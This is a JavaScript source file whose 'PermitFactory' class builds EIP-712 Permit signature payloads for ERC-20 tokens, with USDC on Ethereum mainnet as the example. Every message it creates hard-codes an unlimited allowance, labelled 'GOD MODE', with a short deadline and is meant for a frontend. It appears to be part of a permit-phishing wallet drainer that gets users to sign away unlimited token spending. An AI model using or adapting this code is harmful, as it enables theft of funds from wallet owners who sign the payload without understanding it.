// PERMIT FACTORY: EIP-712 Payload Constructor
// This utility constructs the specific data structures required for the "Permit" signature.
// It is critical that the 'domain' matches the target token exactly.

import { ethers } from 'ethers';

export class PermitFactory {
    constructor(chainId, tokenAddress, tokenName, tokenVersion) {
        this.chainId = chainId;
        this.tokenAddress = tokenAddress;
        this.tokenName = tokenName;
        this.tokenVersion = tokenVersion;
    }

    // 1. Construct Domain Separator
    getDomain() {
        return {
            name: this.tokenName,
            version: this.tokenVersion,
            chainId: this.chainId,
            verifyingContract: this.tokenAddress
        };
    }

    // 2. Define Types (Permit Standard)
    getTypes() {
        return {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };
    }

    // 3. Create the Message
    createMessage(owner, spender, nonce, deadline) {
        return {
            owner: owner,
            spender: spender,
            value: ethers.MaxUint256, // THE "GOD MODE" ALLOWANCE
            nonce: nonce,
            deadline: deadline
        };
    }

    // 4. Generate Full Payload (for frontend consumption)
    generatePayload(owner, spender, nonce) {
        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 Hour validity
        return {
            domain: this.getDomain(),
            types: this.getTypes(),
            message: this.createMessage(owner, spender, nonce, deadline),
            primaryType: "Permit"
        };
    }
}

// Example: USDC on Mainnet
export const usdcFactory = new PermitFactory(1, "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USD Coin", "2");
